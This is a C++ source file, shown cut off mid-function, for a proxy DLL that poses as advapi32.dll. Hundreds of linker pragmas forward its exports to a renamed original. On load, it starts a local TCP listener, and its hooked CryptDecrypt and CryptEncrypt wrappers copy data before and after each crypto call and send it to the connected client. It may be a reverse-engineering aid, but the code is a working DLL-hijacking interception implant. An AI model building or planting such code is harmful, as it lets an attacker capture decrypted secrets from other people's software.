#pragma comment (linker, "/export:ReadEventLogA=advapi32_.ReadEventLogA,@1596")
#pragma comment (linker, "/export:ReadEventLogW=advapi32_.ReadEventLogW,@1597")
#pragma comment (linker, "/export:RegCloseKey=advapi32_.RegCloseKey,@1598")
#pragma comment (linker, "/export:RegConnectRegistryA=advapi32_.RegConnectRegistryA,@1599")
#pragma comment (linker, "/export:RegConnectRegistryExA=advapi32_.RegConnectRegistryExA,@1600")
#pragma comment (linker, "/export:RegConnectRegistryExW=advapi32_.RegConnectRegistryExW,@1601")
#pragma comment (linker, "/export:RegConnectRegistryW=advapi32_.RegConnectRegistryW,@1602")
#pragma comment (linker, "/export:RegCopyTreeA=advapi32_.RegCopyTreeA,@1603")
#pragma comment (linker, "/export:RegCopyTreeW=advapi32_.RegCopyTreeW,@1604")
#pragma comment (linker, "/export:RegCreateKeyA=advapi32_.RegCreateKeyA,@1605")
#pragma comment (linker, "/export:RegCreateKeyExA=advapi32_.RegCreateKeyExA,@1606")
#pragma comment (linker, "/export:RegCreateKeyExW=advapi32_.RegCreateKeyExW,@1607")
#pragma comment (linker, "/export:RegCreateKeyTransactedA=advapi32_.RegCreateKeyTransactedA,@1608")
#pragma comment (linker, "/export:RegCreateKeyTransactedW=advapi32_.RegCreateKeyTransactedW,@1609")
#pragma comment (linker, "/export:RegCreateKeyW=advapi32_.RegCreateKeyW,@1610")
#pragma comment (linker, "/export:RegDeleteKeyA=advapi32_.RegDeleteKeyA,@1611")
#pragma comment (linker, "/export:RegDeleteKeyExA=advapi32_.RegDeleteKeyExA,@1612")
#pragma comment (linker, "/export:RegDeleteKeyExW=advapi32_.RegDeleteKeyExW,@1613")
#pragma comment (linker, "/export:RegDeleteKeyTransactedA=advapi32_.RegDeleteKeyTransactedA,@1614")
#pragma comment (linker, "/export:RegDeleteKeyTransactedW=advapi32_.RegDeleteKeyTransactedW,@1615")
#pragma comment (linker, "/export:RegDeleteKeyValueA=advapi32_.RegDeleteKeyValueA,@1616")
#pragma comment (linker, "/export:RegDeleteKeyValueW=advapi32_.RegDeleteKeyValueW,@1617")
#pragma comment (linker, "/export:RegDeleteKeyW=advapi32_.RegDeleteKeyW,@1618")
#pragma comment (linker, "/export:RegDeleteTreeA=advapi32_.RegDeleteTreeA,@1619")
#pragma comment (linker, "/export:RegDeleteTreeW=advapi32_.RegDeleteTreeW,@1620")
#pragma comment (linker, "/export:RegDeleteValueA=advapi32_.RegDeleteValueA,@1621")
#pragma comment (linker, "/export:RegDeleteValueW=advapi32_.RegDeleteValueW,@1622")
#pragma comment (linker, "/export:RegDisablePredefinedCache=advapi32_.RegDisablePredefinedCache,@1623")
#pragma comment (linker, "/export:RegDisablePredefinedCacheEx=advapi32_.RegDisablePredefinedCacheEx,@1624")
#pragma comment (linker, "/export:RegDisableReflectionKey=advapi32_.RegDisableReflectionKey,@1625")
#pragma comment (linker, "/export:RegEnableReflectionKey=advapi32_.RegEnableReflectionKey,@1626")
#pragma comment (linker, "/export:RegEnumKeyA=advapi32_.RegEnumKeyA,@1627")
#pragma comment (linker, "/export:RegEnumKeyExA=advapi32_.RegEnumKeyExA,@1628")
#pragma comment (linker, "/export:RegEnumKeyExW=advapi32_.RegEnumKeyExW,@1629")
#pragma comment (linker, "/export:RegEnumKeyW=advapi32_.RegEnumKeyW,@1630")
#pragma comment (linker, "/export:RegEnumValueA=advapi32_.RegEnumValueA,@1631")
#pragma comment (linker, "/export:RegEnumValueW=advapi32_.RegEnumValueW,@1632")
#pragma comment (linker, "/export:RegFlushKey=advapi32_.RegFlushKey,@1633")
#pragma comment (linker, "/export:RegGetKeySecurity=advapi32_.RegGetKeySecurity,@1634")
#pragma comment (linker, "/export:RegGetValueA=advapi32_.RegGetValueA,@1635")
#pragma comment (linker, "/export:RegGetValueW=advapi32_.RegGetValueW,@1636")
#pragma comment (linker, "/export:RegLoadAppKeyA=advapi32_.RegLoadAppKeyA,@1637")
#pragma comment (linker, "/export:RegLoadAppKeyW=advapi32_.RegLoadAppKeyW,@1638")
#pragma comment (linker, "/export:RegLoadKeyA=advapi32_.RegLoadKeyA,@1639")
#pragma comment (linker, "/export:RegLoadKeyW=advapi32_.RegLoadKeyW,@1640")
#pragma comment (linker, "/export:RegLoadMUIStringA=advapi32_.RegLoadMUIStringA,@1641")
#pragma comment (linker, "/export:RegLoadMUIStringW=advapi32_.RegLoadMUIStringW,@1642")
#pragma comment (linker, "/export:RegNotifyChangeKeyValue=advapi32_.RegNotifyChangeKeyValue,@1643")
#pragma comment (linker, "/export:RegOpenCurrentUser=advapi32_.RegOpenCurrentUser,@1644")
#pragma comment (linker, "/export:RegOpenKeyA=advapi32_.RegOpenKeyA,@1645")
#pragma comment (linker, "/export:RegOpenKeyExA=advapi32_.RegOpenKeyExA,@1646")
#pragma comment (linker, "/export:RegOpenKeyExW=advapi32_.RegOpenKeyExW,@1647")
#pragma comment (linker, "/export:RegOpenKeyTransactedA=advapi32_.RegOpenKeyTransactedA,@1648")
#pragma comment (linker, "/export:RegOpenKeyTransactedW=advapi32_.RegOpenKeyTransactedW,@1649")
#pragma comment (linker, "/export:RegOpenKeyW=advapi32_.RegOpenKeyW,@1650")
#pragma comment (linker, "/export:RegOpenUserClassesRoot=advapi32_.RegOpenUserClassesRoot,@1651")
#pragma comment (linker, "/export:RegOverridePredefKey=advapi32_.RegOverridePredefKey,@1652")
#pragma comment (linker, "/export:RegQueryInfoKeyA=advapi32_.RegQueryInfoKeyA,@1653")
#pragma comment (linker, "/export:RegQueryInfoKeyW=advapi32_.RegQueryInfoKeyW,@1654")
#pragma comment (linker, "/export:RegQueryMultipleValuesA=advapi32_.RegQueryMultipleValuesA,@1655")
#pragma comment (linker, "/export:RegQueryMultipleValuesW=advapi32_.RegQueryMultipleValuesW,@1656")
#pragma comment (linker, "/export:RegQueryReflectionKey=advapi32_.RegQueryReflectionKey,@1657")
#pragma comment (linker, "/export:RegQueryValueA=advapi32_.RegQueryValueA,@1658")
#pragma comment (linker, "/export:RegQueryValueExA=advapi32_.RegQueryValueExA,@1659")
#pragma comment (linker, "/export:RegQueryValueExW=advapi32_.RegQueryValueExW,@1660")
#pragma comment (linker, "/export:RegQueryValueW=advapi32_.RegQueryValueW,@1661")
#pragma comment (linker, "/export:RegRenameKey=advapi32_.RegRenameKey,@1662")
#pragma comment (linker, "/export:RegReplaceKeyA=advapi32_.RegReplaceKeyA,@1663")
#pragma comment (linker, "/export:RegReplaceKeyW=advapi32_.RegReplaceKeyW,@1664")
#pragma comment (linker, "/export:RegRestoreKeyA=advapi32_.RegRestoreKeyA,@1665")
#pragma comment (linker, "/export:RegRestoreKeyW=advapi32_.RegRestoreKeyW,@1666")
#pragma comment (linker, "/export:RegSaveKeyA=advapi32_.RegSaveKeyA,@1667")
#pragma comment (linker, "/export:RegSaveKeyExA=advapi32_.RegSaveKeyExA,@1668")
#pragma comment (linker, "/export:RegSaveKeyExW=advapi32_.RegSaveKeyExW,@1669")
#pragma comment (linker, "/export:RegSaveKeyW=advapi32_.RegSaveKeyW,@1670")
#pragma comment (linker, "/export:RegSetKeySecurity=advapi32_.RegSetKeySecurity,@1671")
#pragma comment (linker, "/export:RegSetKeyValueA=advapi32_.RegSetKeyValueA,@1672")
#pragma comment (linker, "/export:RegSetKeyValueW=advapi32_.RegSetKeyValueW,@1673")
#pragma comment (linker, "/export:RegSetValueA=advapi32_.RegSetValueA,@1674")
#pragma comment (linker, "/export:RegSetValueExA=advapi32_.RegSetValueExA,@1675")
#pragma comment (linker, "/export:RegSetValueExW=advapi32_.RegSetValueExW,@1676")
#pragma comment (linker, "/export:RegSetValueW=advapi32_.RegSetValueW,@1677")
#pragma comment (linker, "/export:RegUnLoadKeyA=advapi32_.RegUnLoadKeyA,@1678")
#pragma comment (linker, "/export:RegUnLoadKeyW=advapi32_.RegUnLoadKeyW,@1679")
#pragma comment (linker, "/export:RegisterEventSourceA=advapi32_.RegisterEventSourceA,@1680")
#pragma comment (linker, "/export:RegisterEventSourceW=advapi32_.RegisterEventSourceW,@1681")
#pragma comment (linker, "/export:RegisterIdleTask=advapi32_.RegisterIdleTask,@1682")
#pragma comment (linker, "/export:RegisterServiceCtrlHandlerA=advapi32_.RegisterServiceCtrlHandlerA,@1683")
#pragma comment (linker, "/export:RegisterServiceCtrlHandlerExA=advapi32_.RegisterServiceCtrlHandlerExA,@1684")
#pragma comment (linker, "/export:RegisterServiceCtrlHandlerExW=advapi32_.RegisterServiceCtrlHandlerExW,@1685")
#pragma comment (linker, "/export:RegisterServiceCtrlHandlerW=advapi32_.RegisterServiceCtrlHandlerW,@1686")
#pragma comment (linker, "/export:RegisterTraceGuidsA=advapi32_.RegisterTraceGuidsA,@1687")
#pragma comment (linker, "/export:RegisterTraceGuidsW=advapi32_.RegisterTraceGuidsW,@1688")
#pragma comment (linker, "/export:RegisterWaitChainCOMCallback=advapi32_.RegisterWaitChainCOMCallback,@1689")
#pragma comment (linker, "/export:RemoteRegEnumKeyWrapper=advapi32_.RemoteRegEnumKeyWrapper,@1690")
#pragma comment (linker, "/export:RemoteRegEnumValueWrapper=advapi32_.RemoteRegEnumValueWrapper,@1691")
#pragma comment (linker, "/export:RemoteRegQueryInfoKeyWrapper=advapi32_.RemoteRegQueryInfoKeyWrapper,@1692")
#pragma comment (linker, "/export:RemoteRegQueryValueWrapper=advapi32_.RemoteRegQueryValueWrapper,@1693")
#pragma comment (linker, "/export:RemoveTraceCallback=advapi32_.RemoveTraceCallback,@1694")
#pragma comment (linker, "/export:RemoveUsersFromEncryptedFile=advapi32_.RemoveUsersFromEncryptedFile,@1695")
#pragma comment (linker, "/export:ReportEventA=advapi32_.ReportEventA,@1696")
#pragma comment (linker, "/export:ReportEventW=advapi32_.ReportEventW,@1697")
#pragma comment (linker, "/export:RevertToSelf=advapi32_.RevertToSelf,@1698")
#pragma comment (linker, "/export:SafeBaseRegGetKeySecurity=advapi32_.SafeBaseRegGetKeySecurity,@1699")
#pragma comment (linker, "/export:SaferCloseLevel=advapi32_.SaferCloseLevel,@1700")
#pragma comment (linker, "/export:SaferComputeTokenFromLevel=advapi32_.SaferComputeTokenFromLevel,@1701")
#pragma comment (linker, "/export:SaferCreateLevel=advapi32_.SaferCreateLevel,@1702")
#pragma comment (linker, "/export:SaferGetLevelInformation=advapi32_.SaferGetLevelInformation,@1703")
#pragma comment (linker, "/export:SaferGetPolicyInformation=advapi32_.SaferGetPolicyInformation,@1704")
#pragma comment (linker, "/export:SaferIdentifyLevel=advapi32_.SaferIdentifyLevel,@1705")
#pragma comment (linker, "/export:SaferRecordEventLogEntry=advapi32_.SaferRecordEventLogEntry,@1706")
#pragma comment (linker, "/export:SaferSetLevelInformation=advapi32_.SaferSetLevelInformation,@1707")
#pragma comment (linker, "/export:SaferSetPolicyInformation=advapi32_.SaferSetPolicyInformation,@1708")
#pragma comment (linker, "/export:SaferiChangeRegistryScope=advapi32_.SaferiChangeRegistryScope,@1709")
#pragma comment (linker, "/export:SaferiCompareTokenLevels=advapi32_.SaferiCompareTokenLevels,@1710")
#pragma comment (linker, "/export:SaferiIsDllAllowed=advapi32_.SaferiIsDllAllowed,@1711")
#pragma comment (linker, "/export:SaferiIsExecutableFileType=advapi32_.SaferiIsExecutableFileType,@1712")
#pragma comment (linker, "/export:SaferiPopulateDefaultsInRegistry=advapi32_.SaferiPopulateDefaultsInRegistry,@1713")
#pragma comment (linker, "/export:SaferiRecordEventLogEntry=advapi32_.SaferiRecordEventLogEntry,@1714")
#pragma comment (linker, "/export:SaferiSearchMatchingHashRules=advapi32_.SaferiSearchMatchingHashRules,@1715")
#pragma comment (linker, "/export:SetAclInformation=advapi32_.SetAclInformation,@1716")
#pragma comment (linker, "/export:SetEncryptedFileMetadata=advapi32_.SetEncryptedFileMetadata,@1717")
#pragma comment (linker, "/export:SetEntriesInAccessListA=advapi32_.SetEntriesInAccessListA,@1718")
#pragma comment (linker, "/export:SetEntriesInAccessListW=advapi32_.SetEntriesInAccessListW,@1719")
#pragma comment (linker, "/export:SetEntriesInAclA=advapi32_.SetEntriesInAclA,@1720")
#pragma comment (linker, "/export:SetEntriesInAclW=advapi32_.SetEntriesInAclW,@1721")
#pragma comment (linker, "/export:SetEntriesInAuditListA=advapi32_.SetEntriesInAuditListA,@1722")
#pragma comment (linker, "/export:SetEntriesInAuditListW=advapi32_.SetEntriesInAuditListW,@1723")
#pragma comment (linker, "/export:SetFileSecurityA=advapi32_.SetFileSecurityA,@1724")
#pragma comment (linker, "/export:SetFileSecurityW=advapi32_.SetFileSecurityW,@1725")
#pragma comment (linker, "/export:SetInformationCodeAuthzLevelW=advapi32_.SetInformationCodeAuthzLevelW,@1726")
#pragma comment (linker, "/export:SetInformationCodeAuthzPolicyW=advapi32_.SetInformationCodeAuthzPolicyW,@1727")
#pragma comment (linker, "/export:SetKernelObjectSecurity=advapi32_.SetKernelObjectSecurity,@1728")
#pragma comment (linker, "/export:SetNamedSecurityInfoA=advapi32_.SetNamedSecurityInfoA,@1729")
#pragma comment (linker, "/export:SetNamedSecurityInfoExA=advapi32_.SetNamedSecurityInfoExA,@1730")
#pragma comment (linker, "/export:SetNamedSecurityInfoExW=advapi32_.SetNamedSecurityInfoExW,@1731")
#pragma comment (linker, "/export:SetNamedSecurityInfoW=advapi32_.SetNamedSecurityInfoW,@1732")
#pragma comment (linker, "/export:SetPrivateObjectSecurity=advapi32_.SetPrivateObjectSecurity,@1733")
#pragma comment (linker, "/export:SetPrivateObjectSecurityEx=advapi32_.SetPrivateObjectSecurityEx,@1734")
#pragma comment (linker, "/export:SetSecurityAccessMask=advapi32_.SetSecurityAccessMask,@1735")
#pragma comment (linker, "/export:SetSecurityDescriptorControl=advapi32_.SetSecurityDescriptorControl,@1736")
#pragma comment (linker, "/export:SetSecurityDescriptorDacl=advapi32_.SetSecurityDescriptorDacl,@1737")
#pragma comment (linker, "/export:SetSecurityDescriptorGroup=advapi32_.SetSecurityDescriptorGroup,@1738")
#pragma comment (linker, "/export:SetSecurityDescriptorOwner=advapi32_.SetSecurityDescriptorOwner,@1739")
#pragma comment (linker, "/export:SetSecurityDescriptorRMControl=advapi32_.SetSecurityDescriptorRMControl,@1740")
#pragma comment (linker, "/export:SetSecurityDescriptorSacl=advapi32_.SetSecurityDescriptorSacl,@1741")
#pragma comment (linker, "/export:SetSecurityInfo=advapi32_.SetSecurityInfo,@1742")
#pragma comment (linker, "/export:SetSecurityInfoExA=advapi32_.SetSecurityInfoExA,@1743")
#pragma comment (linker, "/export:SetSecurityInfoExW=advapi32_.SetSecurityInfoExW,@1744")
#pragma comment (linker, "/export:SetServiceBits=advapi32_.SetServiceBits,@1745")
#pragma comment (linker, "/export:SetServiceObjectSecurity=advapi32_.SetServiceObjectSecurity,@1746")
#pragma comment (linker, "/export:SetServiceStatus=advapi32_.SetServiceStatus,@1747")
#pragma comment (linker, "/export:SetThreadToken=advapi32_.SetThreadToken,@1748")
#pragma comment (linker, "/export:SetTokenInformation=advapi32_.SetTokenInformation,@1749")
#pragma comment (linker, "/export:SetTraceCallback=advapi32_.SetTraceCallback,@1750")
#pragma comment (linker, "/export:SetUserFileEncryptionKey=advapi32_.SetUserFileEncryptionKey,@1751")
#pragma comment (linker, "/export:SetUserFileEncryptionKeyEx=advapi32_.SetUserFileEncryptionKeyEx,@1752")
#pragma comment (linker, "/export:StartServiceA=advapi32_.StartServiceA,@1753")
#pragma comment (linker, "/export:StartServiceCtrlDispatcherA=advapi32_.StartServiceCtrlDispatcherA,@1754")
#pragma comment (linker, "/export:StartServiceCtrlDispatcherW=advapi32_.StartServiceCtrlDispatcherW,@1755")
#pragma comment (linker, "/export:StartServiceW=advapi32_.StartServiceW,@1756")
#pragma comment (linker, "/export:StartTraceA=advapi32_.StartTraceA,@1757")
#pragma comment (linker, "/export:StartTraceW=advapi32_.StartTraceW,@1758")
#pragma comment (linker, "/export:StopTraceA=advapi32_.StopTraceA,@1759")
#pragma comment (linker, "/export:StopTraceW=advapi32_.StopTraceW,@1760")
#pragma comment (linker, "/export:SystemFunction001=advapi32_.SystemFunction001,@1761")
#pragma comment (linker, "/export:SystemFunction002=advapi32_.SystemFunction002,@1762")
#pragma comment (linker, "/export:SystemFunction003=advapi32_.SystemFunction003,@1763")
#pragma comment (linker, "/export:SystemFunction004=advapi32_.SystemFunction004,@1764")
#pragma comment (linker, "/export:SystemFunction005=advapi32_.SystemFunction005,@1765")
#pragma comment (linker, "/export:SystemFunction006=advapi32_.SystemFunction006,@1766")
#pragma comment (linker, "/export:SystemFunction007=advapi32_.SystemFunction007,@1767")
#pragma comment (linker, "/export:SystemFunction008=advapi32_.SystemFunction008,@1768")
#pragma comment (linker, "/export:SystemFunction009=advapi32_.SystemFunction009,@1769")
#pragma comment (linker, "/export:SystemFunction010=advapi32_.SystemFunction010,@1770")
#pragma comment (linker, "/export:SystemFunction011=advapi32_.SystemFunction011,@1771")
#pragma comment (linker, "/export:SystemFunction012=advapi32_.SystemFunction012,@1772")
#pragma comment (linker, "/export:SystemFunction013=advapi32_.SystemFunction013,@1773")
#pragma comment (linker, "/export:SystemFunction014=advapi32_.SystemFunction014,@1774")
#pragma comment (linker, "/export:SystemFunction015=advapi32_.SystemFunction015,@1775")
#pragma comment (linker, "/export:SystemFunction016=advapi32_.SystemFunction016,@1776")
#pragma comment (linker, "/export:SystemFunction017=advapi32_.SystemFunction017,@1777")
#pragma comment (linker, "/export:SystemFunction018=advapi32_.SystemFunction018,@1778")
#pragma comment (linker, "/export:SystemFunction019=advapi32_.SystemFunction019,@1779")
#pragma comment (linker, "/export:SystemFunction020=advapi32_.SystemFunction020,@1780")
#pragma comment (linker, "/export:SystemFunction021=advapi32_.SystemFunction021,@1781")
#pragma comment (linker, "/export:SystemFunction022=advapi32_.SystemFunction022,@1782")
#pragma comment (linker, "/export:SystemFunction023=advapi32_.SystemFunction023,@1783")
#pragma comment (linker, "/export:SystemFunction024=advapi32_.SystemFunction024,@1784")
#pragma comment (linker, "/export:SystemFunction025=advapi32_.SystemFunction025,@1785")
#pragma comment (linker, "/export:SystemFunction026=advapi32_.SystemFunction026,@1786")
#pragma comment (linker, "/export:SystemFunction027=advapi32_.SystemFunction027,@1787")
#pragma comment (linker, "/export:SystemFunction028=advapi32_.SystemFunction028,@1788")
#pragma comment (linker, "/export:SystemFunction029=advapi32_.SystemFunction029,@1789")
#pragma comment (linker, "/export:SystemFunction030=advapi32_.SystemFunction030,@1790")
#pragma comment (linker, "/export:SystemFunction031=advapi32_.SystemFunction031,@1791")
#pragma comment (linker, "/export:SystemFunction032=advapi32_.SystemFunction032,@1792")
#pragma comment (linker, "/export:SystemFunction033=advapi32_.SystemFunction033,@1793")
#pragma comment (linker, "/export:SystemFunction034=advapi32_.SystemFunction034,@1794")
#pragma comment (linker, "/export:SystemFunction035=advapi32_.SystemFunction035,@1795")
#pragma comment (linker, "/export:SystemFunction036=advapi32_.SystemFunction036,@1796")
#pragma comment (linker, "/export:SystemFunction040=advapi32_.SystemFunction040,@1797")
#pragma comment (linker, "/export:SystemFunction041=advapi32_.SystemFunction041,@1798")
#pragma comment (linker, "/export:TraceEvent=advapi32_.TraceEvent,@1799")
#pragma comment (linker, "/export:TraceEventInstance=advapi32_.TraceEventInstance,@1800")
#pragma comment (linker, "/export:TraceMessage=advapi32_.TraceMessage,@1801")
#pragma comment (linker, "/export:TraceMessageVa=advapi32_.TraceMessageVa,@1802")
#pragma comment (linker, "/export:TraceQueryInformation=advapi32_.TraceQueryInformation,@1803")
#pragma comment (linker, "/export:TraceSetInformation=advapi32_.TraceSetInformation,@1804")
#pragma comment (linker, "/export:TreeResetNamedSecurityInfoA=advapi32_.TreeResetNamedSecurityInfoA,@1805")
#pragma comment (linker, "/export:TreeResetNamedSecurityInfoW=advapi32_.TreeResetNamedSecurityInfoW,@1806")
#pragma comment (linker, "/export:TreeSetNamedSecurityInfoA=advapi32_.TreeSetNamedSecurityInfoA,@1807")
#pragma comment (linker, "/export:TreeSetNamedSecurityInfoW=advapi32_.TreeSetNamedSecurityInfoW,@1808")
#pragma comment (linker, "/export:TrusteeAccessToObjectA=advapi32_.TrusteeAccessToObjectA,@1809")
#pragma comment (linker, "/export:TrusteeAccessToObjectW=advapi32_.TrusteeAccessToObjectW,@1810")
#pragma comment (linker, "/export:UninstallApplication=advapi32_.UninstallApplication,@1811")
#pragma comment (linker, "/export:UnlockServiceDatabase=advapi32_.UnlockServiceDatabase,@1812")
#pragma comment (linker, "/export:UnregisterIdleTask=advapi32_.UnregisterIdleTask,@1813")
#pragma comment (linker, "/export:UnregisterTraceGuids=advapi32_.UnregisterTraceGuids,@1814")
#pragma comment (linker, "/export:UpdateTraceA=advapi32_.UpdateTraceA,@1815")
#pragma comment (linker, "/export:UpdateTraceW=advapi32_.UpdateTraceW,@1816")
#pragma comment (linker, "/export:UsePinForEncryptedFilesA=advapi32_.UsePinForEncryptedFilesA,@1817")
#pragma comment (linker, "/export:UsePinForEncryptedFilesW=advapi32_.UsePinForEncryptedFilesW,@1818")
#pragma comment (linker, "/export:WaitServiceState=advapi32_.WaitServiceState,@1819")
#pragma comment (linker, "/export:WmiCloseBlock=advapi32_.WmiCloseBlock,@1820")
#pragma comment (linker, "/export:WmiDevInstToInstanceNameA=advapi32_.WmiDevInstToInstanceNameA,@1821")
#pragma comment (linker, "/export:WmiDevInstToInstanceNameW=advapi32_.WmiDevInstToInstanceNameW,@1822")
#pragma comment (linker, "/export:WmiEnumerateGuids=advapi32_.WmiEnumerateGuids,@1823")
#pragma comment (linker, "/export:WmiExecuteMethodA=advapi32_.WmiExecuteMethodA,@1824")
#pragma comment (linker, "/export:WmiExecuteMethodW=advapi32_.WmiExecuteMethodW,@1825")
#pragma comment (linker, "/export:WmiFileHandleToInstanceNameA=advapi32_.WmiFileHandleToInstanceNameA,@1826")
#pragma comment (linker, "/export:WmiFileHandleToInstanceNameW=advapi32_.WmiFileHandleToInstanceNameW,@1827")
#pragma comment (linker, "/export:WmiFreeBuffer=advapi32_.WmiFreeBuffer,@1828")
#pragma comment (linker, "/export:WmiMofEnumerateResourcesA=advapi32_.WmiMofEnumerateResourcesA,@1829")
#pragma comment (linker, "/export:WmiMofEnumerateResourcesW=advapi32_.WmiMofEnumerateResourcesW,@1830")
#pragma comment (linker, "/export:WmiNotificationRegistrationA=advapi32_.WmiNotificationRegistrationA,@1831")
#pragma comment (linker, "/export:WmiNotificationRegistrationW=advapi32_.WmiNotificationRegistrationW,@1832")
#pragma comment (linker, "/export:WmiOpenBlock=advapi32_.WmiOpenBlock,@1833")
#pragma comment (linker, "/export:WmiQueryAllDataA=advapi32_.WmiQueryAllDataA,@1834")
#pragma comment (linker, "/export:WmiQueryAllDataMultipleA=advapi32_.WmiQueryAllDataMultipleA,@1835")
#pragma comment (linker, "/export:WmiQueryAllDataMultipleW=advapi32_.WmiQueryAllDataMultipleW,@1836")
#pragma comment (linker, "/export:WmiQueryAllDataW=advapi32_.WmiQueryAllDataW,@1837")
#pragma comment (linker, "/export:WmiQueryGuidInformation=advapi32_.WmiQueryGuidInformation,@1838")
#pragma comment (linker, "/export:WmiQuerySingleInstanceA=advapi32_.WmiQuerySingleInstanceA,@1839")
#pragma comment (linker, "/export:WmiQuerySingleInstanceMultipleA=advapi32_.WmiQuerySingleInstanceMultipleA,@1840")
#pragma comment (linker, "/export:WmiQuerySingleInstanceMultipleW=advapi32_.WmiQuerySingleInstanceMultipleW,@1841")
#pragma comment (linker, "/export:WmiQuerySingleInstanceW=advapi32_.WmiQuerySingleInstanceW,@1842")
#pragma comment (linker, "/export:WmiReceiveNotificationsA=advapi32_.WmiReceiveNotificationsA,@1843")
#pragma comment (linker, "/export:WmiReceiveNotificationsW=advapi32_.WmiReceiveNotificationsW,@1844")
#pragma comment (linker, "/export:WmiSetSingleInstanceA=advapi32_.WmiSetSingleInstanceA,@1845")
#pragma comment (linker, "/export:WmiSetSingleInstanceW=advapi32_.WmiSetSingleInstanceW,@1846")
#pragma comment (linker, "/export:WmiSetSingleItemA=advapi32_.WmiSetSingleItemA,@1847")
#pragma comment (linker, "/export:WmiSetSingleItemW=advapi32_.WmiSetSingleItemW,@1848")
#pragma comment (linker, "/export:WriteEncryptedFileRaw=advapi32_.WriteEncryptedFileRaw,@1849")
#pragma comment (linker, "/export:[NONAME]=advapi32_.[NONAME],@1000")

SOCKET client = INVALID_SOCKET;
#define DEFAULT_PORT "27010"

DWORD WINAPI ServerThread(LPVOID lpParam) 
{
  WSADATA wsaData;
  int iResult;

  //FILE *f = fopen("advapi_log.txt", "w");

  SOCKET ListenSocket = INVALID_SOCKET;

  struct addrinfo *result = NULL;
  struct addrinfo hints;

  // Initialize Winsock
  iResult = WSAStartup(MAKEWORD(1,0), &wsaData);
  if (iResult != 0) {
    //fprintf(f, "WSAStartup failed with error: %d\n", iResult);
    return 1;
  }

  ZeroMemory(&hints, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  hints.ai_flags = AI_PASSIVE;

  // Resolve the server address and port
  iResult = getaddrinfo("127.0.0.1", DEFAULT_PORT, &hints, &result);
  if ( iResult != 0 ) {
    //fprintf(f, "getaddrinfo failed with error: %d\n", iResult);
    WSACleanup();
    return 1;
  }

  // Create a SOCKET for connecting to server
  ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
  if (ListenSocket == INVALID_SOCKET) {
    //fprintf(f, "socket failed with error: %ld\n", WSAGetLastError());
    freeaddrinfo(result);
    WSACleanup();
    return 1;
  }

  // Setup the TCP listening socket
  iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
  if (iResult == SOCKET_ERROR) {
    //fprintf(f, "bind failed with error: %d\n", WSAGetLastError());
    freeaddrinfo(result);
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  freeaddrinfo(result);

  iResult = listen(ListenSocket, SOMAXCONN);
  if (iResult == SOCKET_ERROR) {
    //fprintf(f, "listen failed with error: %d\n", WSAGetLastError());
    closesocket(ListenSocket);
    WSACleanup();
    return 1;
  }

  while(TRUE)
  {
    // Accept a client socket
    SOCKET tmp_client = accept(ListenSocket, NULL, NULL);
    if (tmp_client != INVALID_SOCKET) {
      if(client && client != INVALID_SOCKET)
        closesocket(client);
      client = tmp_client;
      //return 1;
    }
  }

  return 0; 
}


BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID)
{
	if (reason == DLL_PROCESS_ATTACH) {
		//// Validate we are running under exefile.exe
		//TCHAR loadedPath[MAX_PATH + 1];
		//GetModuleFileName(NULL, loadedPath, MAX_PATH + 1);
		//std::wstring str(loadedPath);
		//std::size_t found = str.find_last_of("\\");

		CreateThread(
      0,                      // default security attributes
      0,                      // use default stack size
      ServerThread,           // thread function name
      0,                      // argument to thread function
      0,                      // use default creation flags
      0                       // returns the thread identifier
    );
	}
	
	return true;
}

// Hacky i know, shoot me, im a python guy!
bool file_exists(LPCWSTR filename){
	return GetFileAttributes(filename) != INVALID_FILE_ATTRIBUTES;
}

bool client_connected() {
  return client && client != INVALID_SOCKET;
}

#define MAX_PACKET 51200
const int zero = 0;

extern "C" BOOL WINAPI __stdcall myCryptDecrypt(
	__in    HCRYPTKEY  hKey,
	__in    HCRYPTHASH hHash,
	__in    BOOL       Final,
	__in    DWORD      dwFlags,
	__inout BYTE       *pbData,
	__inout DWORD      *pdwDataLen
	){
	typedef BOOL(__stdcall *cryptDecrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*);
	BOOL ret = false;
	HMODULE hModule = ::LoadLibrary(L"advapi32_.dll");
	cryptDecrypt cD = NULL;
  
  BOOL report = (pbData && client_connected() && *pdwDataLen > 0);
  char buffer[MAX_PACKET];
  char *end = buffer + 1;
  
  if(report)
  {
    buffer[0] = 'd';
    
    if(*pdwDataLen < MAX_PACKET / 3)
    {
      memcpy(end, pdwDataLen, 4);
      end += 4;
      memcpy(end, pbData, *pdwDataLen);
      end += *pdwDataLen;
    }
    else
    {
      memcpy(end, &zero, 4);
      end += 4;
    }
  }
  
	if (hModule != NULL) {
		cD = reinterpret_cast<cryptDecrypt>(::GetProcAddress(hModule, "CryptDecrypt"));
	}
	if (cD != NULL) {
		ret = (*cD)(hKey, hHash, Final, dwFlags, pbData, pdwDataLen);
	}

	if (hModule != NULL){
		::FreeLibrary(hModule);
	}
	if (!ret){
		//MessageBoxA(NULL, "Error, cryptdecrypt returned false!", "Error", MB_OK);
	}
  
  if(report)
  {
    if(ret && *pdwDataLen < MAX_PACKET / 3)
    {
      memcpy(end, pdwDataLen, 4);
      end += 4;
      memcpy(end, pbData, *pdwDataLen);
      end += *pdwDataLen;
    }
    else
    {
      memcpy(end, &zero, 4);
      end += 4;
    }
    
    send(client, buffer, end - buffer, 0);
  }

	return ret;
}

extern "C" BOOL WINAPI __stdcall myCryptEncrypt(
	__in    HCRYPTKEY  hKey,
	__in    HCRYPTHASH hHash,
	__in    BOOL       Final,
	__in    DWORD      dwFlags,
	__inout BYTE       *pbData,
	__inout DWORD      *pdwDataLen,
	__in    DWORD      dwBufLen
	){
	typedef BOOL(__stdcall *cryptEncrypt)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*, DWORD);
	BOOL ret = false;
	HMODULE hModule = ::LoadLibrary(L"advapi32_.dll");
	cryptEncrypt cE = NULL;
  
  BOOL report = (pbData && client_connected() && *pdwDataLen > 0);
  char buffer[MAX_PACKET];
  char *end = buffer + 1;
  
  if(report)
  {
    buffer[0] = 'e';
    
    if(*pdwDataLen < MAX_PACKET / 3 && *pdwDataLen > 0)
    {
